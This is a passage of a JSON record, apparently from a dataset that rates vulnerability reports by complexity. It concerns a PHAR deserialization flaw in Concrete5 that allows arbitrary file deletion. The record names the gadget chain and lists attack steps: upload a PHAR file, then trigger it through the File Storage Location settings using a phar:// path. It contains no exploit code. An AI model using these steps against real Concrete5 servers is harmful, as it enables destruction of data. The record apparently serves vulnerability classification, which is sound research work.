      "Upload the PHAR file to the server using the file upload feature in Concrete5."
    ],
    [
      3,
      "Trigger the PHAR deserialization by navigating to 'Dashboard => System&Settings => File Storage Location => Add Location' and inputting the PHAR file path with 'phar://' schema."
    ]
  ],
  "vuln_description": "The vulnerability allows an attacker to delete arbitrary files on the server by exploiting a PHAR deserialization bug in Concrete5. The attack involves chaining multiple gadgets (VolatileDirectory::__destruct(), Filesystem::deleteDirectory(), and Filesystem::delete()) to achieve file deletion through the is_dir() function when processing a malicious PHAR file.",
  "reason": "This vulnerability involves multiple complex components: understanding PHAR deserialization, chaining several gadgets (POP technique), and manipulating the application state to trigger the deserialization via filesystem functions. The interaction between these components is non-obvious and requires deep knowledge of PHP internals and object-oriented programming.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}